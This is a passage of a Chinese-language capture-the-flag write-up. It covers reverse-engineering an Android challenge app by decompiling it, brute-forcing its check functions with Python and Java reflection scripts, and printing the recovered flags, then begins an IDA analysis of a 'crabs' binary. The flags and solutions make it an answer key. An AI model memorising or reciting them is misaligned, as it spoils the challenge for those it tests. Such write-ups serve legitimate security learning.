3。</p>\n<p>运行下面的脚本，得到我方出拳顺序</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rival=[<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(rival))</span><br><span class=\"line\">my = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> rival:</span><br><span class=\"line\">    my.append((x+<span class=\"number\">1</span>)%<span class=\"number\">3</span>+<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> my:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(x,end=<span class=\"string\">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<p>结果为</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1211111213313331123112111232113113213322122121121231121112122232132131121222112212133233122212211221121213221131133331131313223212313113132123311232131113211312123211311231131312221123133313111231311313212221123112321313232213211113132133311321131113123222</span><br></pre></td></tr></table></figure></p>\n<p>粘贴到安卓程序中，得到以下 flag 片段</p>\n<p><code>Android_is_very_interesting_and_</code></p>\n<h3 id=\"第二问猜数字\"><a class=\"anchor\" href=\"#第二问猜数字\">#</a> 第二问：猜数字</h3>\n<p>第二第三问需要以下工具</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2phdmEtZGVjb21waWxlci9qZC1ndWk=\">https://github.com/java-decompiler/jd-gui</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3B4YjE5ODgvZGV4Mmphcg==\">https://github.com/pxb1988/dex2jar</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2thdHJpbmF3ai9hcnRpY2xlL2RldGFpbHMvODAwMTYzMTU=\">https://blog.csdn.net/katrinawj/article/details/80016315</span></p>\n<p>这样反编译可以得到 java 代码，可读性比 smali 更优</p>\n<p>在 <code>com/w4ter.w4terctf2024/SecondCheck.class</code> ，其中的函数 <code>check0</code>  到 <code>check15</code>  就是分别对 16 个数字进行检验</p>\n<p>以 <code>check10</code>  为例，</p>\n<p><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"type\">boolean</span> <span class=\"title function_\">check10</span><span class=\"params\">(<span class=\"type\">int</span> paramInt)</span> &#123;</span><br><span class=\"line\">  paramInt = xor(xor(xor(add(mul(add(mul(xor(add(mul(sub(paramInt, <span class=\"number\">5</span>), <span class=\"number\">2</span>), <span class=\"number\">3</span>), <span class=\"number\">8</span>), <span class=\"number\">11</span>), <span class=\"number\">8</span>), <span class=\"number\">14</span>), <span class=\"number\">14</span>), <span class=\"number\">6</span>), <span class=\"number\">10</span>), <span class=\"number\">13</span>);</span><br><span class=\"line\">  <span class=\"type\">boolean</span> <span class=\"variable\">bool</span> <span class=\"operator\">=</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (sub(mul(xor(sub(add(paramInt, <span class=\"number\">1</span>), <span class=\"number\">9</span>), <span class=\"number\">12</span>), <span class=\"number\">3</span>), <span class=\"number\">4</span>) != <span class=\"number\">1117943</span>)</span><br><span class=\"line\">    bool = <span class=\"literal\">false</span>; </span><br><span class=\"line\">  <span class=\"keyword\">return</span> bool;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>使用下面的 python 脚本，可以枚举出第 10 个数字</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">xor</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a ^ b</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a + b</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sub</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a - b</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mul</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a * b</span><br><span class=\"line\"></span><br><span class=\"line\">i=<span class=\"number\">10</span></span><br><span class=\"line\">up = <span class=\"number\">2</span>**(i+<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, up+<span class=\"number\">1</span>):</span><br><span class=\"line\">    paramInt = j</span><br><span class=\"line\">    paramInt = xor(xor(xor(add(mul(</span><br><span class=\"line\">        add(mul(xor(add(mul(sub(paramInt, <span class=\"number\">5</span>), <span class=\"number\">2</span>), <span class=\"number\">3</span>), <span class=\"number\">8</span>), <span class=\"number\">11</span>), <span class=\"number\">8</span>), <span class=\"number\">14</span>), <span class=\"number\">14</span>), <span class=\"number\">6</span>), <span class=\"number\">10</span>), <span class=\"number\">13</span>)</span><br><span class=\"line\">    i = sub(paramInt, <span class=\"number\">6</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> (sub(mul(xor(sub(add(paramInt, <span class=\"number\">1</span>), <span class=\"number\">9</span>), <span class=\"number\">12</span>), <span class=\"number\">3</span>), <span class=\"number\">4</span>) != <span class=\"number\">1117943</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;j&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>运行结果是 1217</p>\n<p>类似的，可以得到全部 16 个数字</p>\n<p>2,3,7,14,18,44,82,235,365,715,1217,3774,6025,14042,28572,51291</p>\n<p>输入到安卓程序中，得到以下 flag 片段</p>\n<p><code>Smkhwxi8wnGu14Jq</code></p>\n<h3 id=\"第三问直捣黄龙\"><a class=\"anchor\" href=\"#第三问直捣黄龙\">#</a> 第三问：直捣黄龙</h3>\n<p>在 <code>com/w4ter.w4terctf2024/ThirdCheck.class</code> ，其中的函数 <code>check0</code>  到 <code>check23</code>  就是分别对 24 个字母进行检验</p>\n<p>与之前不同的是，代码中加入了些奇怪的东西</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/1cfaVgDsSPFkeyB.png\" alt=\"android-3\" /></p>\n<p>要想结束 while 循环，就必须执行 3 处的 break，所以正确的字母输入后一定会执行 2 和 3 处的代码</p>\n<p>2 处的代码会用到 i 的值，如果输入正确的字母后，只执行 2 处代码没有执行 1 处的代码，i 的值就恒定为 0 而与 paramInt 无关，结果是 paramInt 输入任何值都是合法的，这显然不合理，所以 1 处的代码一定会被执行</p>\n<p>综上分析，第三问混淆的代码应该不会影响正常的执行逻辑，可以直接无视。</p>\n<p>和第二问一样，写出以下脚本枚举字符</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">xor</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a ^ b</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a + b</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sub</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a - b</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mul</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a * b</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># paramInt = 2</span></span><br><span class=\"line\"><span class=\"comment\"># print(xor(xor(add(mul(add(xor(add(xor(sub(sub(add(xor(xor(paramInt, 1), 7), 7), 13), 8), 14), 5), 2), 12), 10), 14), 2), 5))</span></span><br><span class=\"line\">up=<span class=\"number\">256</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,up+<span class=\"number\">1</span>):</span><br><span class=\"line\">    paramInt = j</span><br><span class=\"line\">    i = sub(add(add(xor(paramInt, <span class=\"number\">9</span>), <span class=\"number\">3</span>), <span class=\"number\">10</span>), <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sub(mul(xor(mul(i, <span class=\"number\">1</span>), <span class=\"number\">2</span>), <span class=\"number\">3</span>), <span class=\"number\">5</span>) == <span class=\"number\">313</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;j&#125;</span>,<span class=\"subst\">&#123;<span class=\"built_in\">chr</span>(j)&#125;</span>&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>可以得到第三个字符是 <code>l</code></p>\n<p>类似的，可以枚举得出其他字符，结果为</p>\n<p><code>I_like_Android_Reverse!!</code></p>\n<h3 id=\"java脚本\"><a class=\"anchor\" href=\"#java脚本\">#</a> java 脚本</h3>\n<blockquote>\n<p>更简便的方法？</p>\n</blockquote>\n<p>利用已有的 java 源代码可写 java 脚本爆破：</p>\n<p><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.lang.System;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> SecondCheck.SecondCheck;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ThirdCheck.ThirdCheck;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Hack</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span>[] ENC2 = <span class=\"keyword\">new</span> <span class=\"title class_\">int</span>[] &#123; </span><br><span class=\"line\">        <span class=\"number\">901</span>, <span class=\"number\">1554</span>, <span class=\"number\">17367</span>, <span class=\"number\">53318</span>, <span class=\"number\">68796</span>, <span class=\"number\">19575</span>, <span class=\"number\">1957</span>, <span class=\"number\">1461</span>, <span class=\"number\">485</span>, <span class=\"number\">790</span>, </span><br><span class=\"line\">        <span class=\"number\">1281</span>, <span class=\"number\">218036</span>, <span class=\"number\">54829</span>, <span class=\"number\">2367142</span>, <span class=\"number\">28073245</span>, <span class=\"number\">51410</span> &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">char</span>[] flag1 = <span class=\"keyword\">new</span> <span class=\"title class_\">char</span>[<span class=\"number\">16</span>];</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>; i &lt;= Math.pow(<span class=\"number\">2</span>,<span class=\"number\">16</span>); i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">j</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)&#123;</span><br><span class=\"line\">                <span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> SecondCheck.class.getDeclaredMethod(<span class=\"string\">&quot;check&quot;</span> + j, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[] &#123; <span class=\"type\">int</span>.class &#125;);</span><br><span class=\"line\">                method.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (callCheck(method, (i))) &#123;</span><br><span class=\"line\">                    <span class=\"type\">String</span> <span class=\"variable\">str1</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;flag&quot;</span> + j;</span><br><span class=\"line\">                    Class&lt;Integer&gt; clazz = <span class=\"type\">int</span>.class;</span><br><span class=\"line\">                    <span class=\"type\">Method</span> <span class=\"variable\">method2</span> <span class=\"operator\">=</span> SecondCheck.class.getDeclaredMethod(str1, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[] &#123; clazz, clazz &#125;);</span><br><span class=\"line\">                    method2.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">                    flag1[j] = (<span class=\"type\">char</span>)callFlag(method2, ENC2[j], i);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">char</span>[] flag2 = <span class=\"keyword\">new</span> <span class=\"title class_\">char</span>[<span class=\"number\">24</span>];</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>; i &lt;= <span class=\"number\">256</span>; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">byte</span> <span class=\"variable\">j</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; j &lt; <span class=\"number\">24</span>; j++) &#123;</span><br><span class=\"line\">                <span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> ThirdCheck.class.getDeclaredMethod(<span class=\"string\">&quot;flag&quot;</span> + j, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[] &#123; <span class=\"type\">int</span>.class &#125;);</span><br><span class=\"line\">                method.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (callFlag(method, i)) &#123;</span><br><span class=\"line\">                    flag2[j] = (<span class=\"type\">char</span>)i;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(flag1);</span><br><span class=\"line\">        System.out.println(flag2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">callFlag</span><span class=\"params\">(Method paramMethod, <span class=\"type\">int</span> paramInt)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">object</span> <span class=\"operator\">=</span> paramMethod.invoke(<span class=\"keyword\">new</span> <span class=\"title class_\">ThirdCheck</span>(), <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[] &#123; Integer.valueOf(paramInt) &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (object <span class=\"keyword\">instanceof</span> Boolean) ? ((Boolean)object).booleanValue() : <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">callFlag</span><span class=\"params\">(Method paramMethod, <span class=\"type\">int</span> paramInt1, <span class=\"type\">int</span> paramInt2)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">object</span> <span class=\"operator\">=</span> paramMethod.invoke(<span class=\"keyword\">new</span> <span class=\"title class_\">SecondCheck</span>(), <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[] &#123; Integer.valueOf(paramInt1), Integer.valueOf(paramInt2) &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (object <span class=\"keyword\">instanceof</span> Integer) ? ((Integer)object).intValue() : <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">callCheck</span><span class=\"params\">(Method paramMethod, <span class=\"type\">int</span> paramInt)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">object</span> <span class=\"operator\">=</span> paramMethod.invoke(<span class=\"keyword\">new</span> <span class=\"title class_\">SecondCheck</span>(), <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[] &#123; Integer.valueOf(paramInt) &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (object <span class=\"keyword\">instanceof</span> Boolean) ? ((Boolean)object).booleanValue() : <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>命令：</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javac Hack.java </span><br><span class=\"line\">java Hack</span><br></pre></td></tr></table></figure></p>\n<p>可以直接得到后面两关的 flag 片段:</p>\n<p><figure class=\"highlight erlang-repl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Smkhwxi8wnGu14Jq</span><br><span class=\"line\">I_like_Android_Reverse!!</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"crabs\"><a class=\"anchor\" href=\"#crabs\">#</a> crabs</h2>\n<p>使用 IDA 进行逆向</p>\n<p>反编译 main 函数：</p>\n<p><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Enter your flag, and get a picture&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%s&quot;</span>, &amp;v8);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)sub_1209(&amp;v8) )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Here is your picture&quot;</span>);</span><br><span class=\"line\">  sub_1483(&amp;qword_8390);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)sub_2B4D(&amp;qword_8390, &amp;v8, v4, v5, v6, v7, v8, v9) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;nonono, ugly 